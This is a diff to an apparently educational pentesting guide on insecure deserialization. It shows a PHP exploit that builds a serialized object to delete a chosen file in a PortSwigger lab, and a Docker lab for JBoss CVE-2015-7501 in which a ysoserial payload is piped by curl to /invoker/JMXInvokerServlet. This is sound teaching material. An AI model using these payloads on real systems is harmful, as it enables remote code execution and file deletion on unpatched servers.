@@ -551,9 +551,9 @@ Let's explore this on [PortSwigger Lab](https://portswigger.net/web-security/des
 - Append `~` on the file and send the request again.
 ![image](https://user-images.githubusercontent.com/47778874/227761124-775196c7-d001-464b-9707-afb54d004c5f.png)
 - We can find the source code, let's download the source code and analyze it to find the vulnerability.
-
 ```php
 <?php
+
 class CustomTemplate {
     private $template_file_path;
     private $lock_file_path;
@@ -587,12 +587,11 @@ class CustomTemplate {
 }
 ?>
 ```
-
 - In the above code, we can see that it contains a **__destruct()** method which will be triggered at the end of execution on this PHP file. The **__destruct()** method will check whether the file exists on the system and using the **unlink()** method it will delete the file if it exist. The **unlink()** method on the PHP is used to delete the file.
 - Let's create an exploit for this
-
 ```php
 <?php
+
 class CustomTemplate
 {
     public function __construct()
@@ -604,7 +603,6 @@ $obj = new CustomTemplate();
 echo serialize($obj);
 ?>
 ```
-
 - Here the code contains a **CustomTemplate** class which has **__construct()** method and it will be executed every time the class CustomTemplate is instantiated. The construct method is used to initalize the property to the string parameter called **lock_file_path** and prints its serialized object.
 - So in the server side, when the object is unserialized, the **__destruct()** method will be triggered and check for the existence of file passed on **lock_file_path** parameter and if it exist, it will delete the file.
 - Run the code to create a serialized object.
@@ -639,4 +637,129 @@ public final void writeObject(object x) throws IOException
 public final Object readObject() throws IOException,ClassNotFoundException
 ```
 You can learn about [Java Serialization and Deserialization more here.](https://www.studytonight.com/java/serialization-and-deserialization.php)
+
+For a lab demonstration, we will be exploiting the [Insecure Deserialization on JBoss 6.1.0 CVE-2015-7501](https://www.rapid7.com/db/vulnerabilities/red_hat-jboss_eap-cve-2015-7501/).
+- To build the lab, we have to use the docker build. Save below configurations on a Dockerfile.
+```bash
+mkdir java-desc
+cd java-desc
+vim Dockerfile
+```
+```dockerfile
+FROM jboss/base:latest
+EXPOSE 8080
+
+ENV SERVER_HOME /opt/jboss/server/
+ENV JBOSS_HOME /opt/jboss/server/jboss-6.1.0.Final/
+
+USER root
+
+RUN mkdir $SERVER_HOME
+
+RUN cd $SERVER_HOME \
+    && curl -O https://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip \
+    && unzip jboss-as-distribution-6.1.0.Final.zip \
+    && curl -O https://download.java.net/openjdk/jdk7u75/ri/jdk_ri-7u75-b13-linux-x64-18_dec_2014.tar.gz \
+    && tar xfz jdk_ri-7u75-b13-linux-x64-18_dec_2014.tar.gz \
+    && rm jdk_ri-7u75-b13-linux-x64-18_dec_2014.tar.gz \
+    && rm jboss-as-distribution-6.1.0.Final.zip
+
+RUN echo "JAVA=/opt/jboss/server/java-se-7u75-ri/bin/java" >> /opt/jboss/server/jboss-6.1.0.Final/bin/run.conf
+
+
+ENV LAUNCH_JBOSS_IN_BACKGROUND true
+
+CMD ["/opt/jboss/server/jboss-6.1.0.Final/bin/run.sh", "-b", "0.0.0.0"]
+
+```
+- Start Docker Desktop or daemon.
+- Build the docker.
+```bash
+docker build . -t jboss
+```
+- Run the docker image
+```bash
+docker run -p 8080:8080 jboss
+```
+- Navigating into **YOUR-IP:8080**, we can see the JBOSS web app displayed.
+![image](https://user-images.githubusercontent.com/47778874/228146731-fa168878-be96-4f8f-9a2c-1a654e666bd3.png)
+- Navigate to **YOUR-IP:8080/invoker/JMXInvokerServlet** and intercept the request with burp.
+- You might need to change the listening port on burp.
+- If we watch closely on the response, we can see the header **¬ísr$** which is Java Serialized data.
+![image](https://user-images.githubusercontent.com/47778874/228147707-7edc0bd4-1da3-47fa-b13e-07329f00d4f4.png)
+- If we decode that value using ASCII Hex value, we can get **aced0005** and if we see this value in any of Hex data, we can confirm that this is serialized object.
+- ![image](https://user-images.githubusercontent.com/47778874/228148457-5ca87e47-159d-48cb-83c2-658cd27f07fd.png)
+- Also, if we encode that HEX value with Base64 encoder we can have an encoded value **rO0ABXNyACQ=** which is also the Base64 representation of Java Serialized object.
+- ![image](https://user-images.githubusercontent.com/47778874/228149533-d032a58e-669e-42d6-ae1c-03e092a77bd1.png)
+- Until now, we cannot verify either the application contains insecure deserialization vulnerability, we can perform some hit and trial with [ysoserial](https://github.com/frohoff/ysoserial).
+- Let's perform some source code analysis at first and find where and how this vulnerability existed. You can download the source code from [JBOSS Web Site](https://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final-src.zip)
+```bash
+wget https://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final-src.zip
+unzip jboss-as-distribution-6.1.0.Final-src.zip
+cd jboss-6.1.0.Final-src
+```
+- Open the code base on VS Code or any other applications.
+- As discussed on the explanation about **readObject()** method of **ObjectInputStream** class, we need to find if that method is implemented since serialization is performed. Also, all the **readObject()** method on the source code might not be vulnerable. Since we knew that the vulnerability exists on **invoker/JMXInvokerServlet**, we can search for **readObject()** method using VS Code and include `*servlet` on the files to include.
+![image](https://user-images.githubusercontent.com/47778874/228157852-1d8716a3-441e-487d-bf7b-71ae7c8fe99b.png)
+- The Java file you should be looking on is `varia/src/main/java/org/jboss/invocation/http/servlet/InvokerServlet.java`
+![image](https://user-images.githubusercontent.com/47778874/228160759-e93db96b-0993-4209-8e6c-6d0b3ab48642.png)
+- If we see the above code between lines 116-138, we can find a **ois.readObject()** method, which comes from **ObjectInputStream** and it comes from **ServletInputStream** and that is created from **request.getInputStream()**. This **request** is passed as **HttpServletRequest** parameter in **processRequest()** method.
+- We need to find where this **processRequest()** method is called within this Java file and we can find two methods **doGet** and **doPost** between line 219-233 where **processRequest()** is called. **doGet** and **doPost** are methods of the javax.servlet.http.HttpServlet class that are used to handle HTTP GET and POST requests, respectively. Therefore when we performed GET request on the **/invoker/JMXInvokerServlet** endpoint, we got some serialized object back.
+- When we send some serialized object on above endpoint with POST request, it triggers the **doPost** method, the **doPost** method calls **processRequest** method and it will deserializes the object using below code which is executed when **processRequest** method is triggered.
+```java
+ServletInputStream sis = request.getInputStream();
+ObjectInputStream ois = new ObjectInputStream(sis);
+mi = (MarshalledInvocation) ois.readObject();
+ois.close();
+```
+- Sometimes we do not get such endpoints easily, in such case we can find the endpoint from **web.xml**. Search your class name on web.xml file, we can find our class name on **<servlet-class>org.jboss.invocation.http.servlet.InvokerServlet</servlet-class>** and which is defined under **<servlet-name>JMXInvokerServlet</servlet-name>**.
+```xml
+   <servlet>
+       <servlet-name>JMXInvokerServlet</servlet-name>
+       <description>The JMXInvokerServlet receives posts containing serlized
+       MarshalledInvocation objects that are routed to the invoker given by
+       the the MBean whose object name hash is specified by the
+       invocation.getObjectName() value. The return content is a serialized
+       MarshalledValue containg the return value of the inovocation, or any
+       exception that may have been thrown.
+       </description>
+       <servlet-class>org.jboss.invocation.http.servlet.InvokerServlet</servlet-class>
+       <load-on-startup>1</load-on-startup>
+   </servlet>
+```
+- And if we search the keyword **JMXInvokerServlet** on the same XML file, we can find the endpoint.
+```xml
+<servlet-mapping>
+       <servlet-name>JMXInvokerServlet</servlet-name>
+       <url-pattern>/JMXInvokerServlet/*</url-pattern>
+</servlet-mapping>
+```
+- But this only provided **/JMXInvokerServlet/** but as we see above we also need **invoke/JMXInvokerServlet/**. If we navigated to **jboss-service.xml** which is on the same directory as **web.xml** and searched **JMXInvokerServlet** we can find the full URL endpoint as shown below.
+```xml
+<value-factory bean="ServiceBindingManager" method="getStringBinding">
+   <parameter>jboss.web:service=WebServer</parameter>
+   <parameter>HttpConnector</parameter>
+   <parameter>http://${hostforurl}:${port}/invoker/JMXInvokerServlet</parameter>
+</value-factory>
+```
+- In this way, we can map the URL endpoint with the source code. Now let's get back to our insecure deserialization vulnerability.
+- Inorder to exploit it we need to locate the gadget, craft the exploit payload and submit the payload to the target application.
+- We will be using ysoserial to craft the payload. It is a tool that allows us to generated malicious serialized object.
+- Download the ysoserial JAR file from [here.](https://github.com/frohoff/ysoserial/releases/tag/v0.0.6)
+```bash
+wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
+```
+- Generate the payload and send it's output through CURL command to the endpoint.
+```bash
+java -jar ysoserial-all.jar CommonsCollections1 "touch /tmp/nirajkharel" | curl -X POST --data-binary @- http://YOUR-IP:8080/invoker/JMXInvokerServlet
+```
+- Here `@-` is used to pass the value of yoserial  and `--data-binary` is used since binary object is passed on the request.
+- If successfull, there will be a file called `nirajkharel` under `/tmp` directory.
+```bash
+docker ps -a
+docker exec -it <Container-ID> /bin/bash
+cd /tmp
+ls
+hsperfdata_root  ks-script-V_wEqJ  nirajkharel  yum.log
+```
 
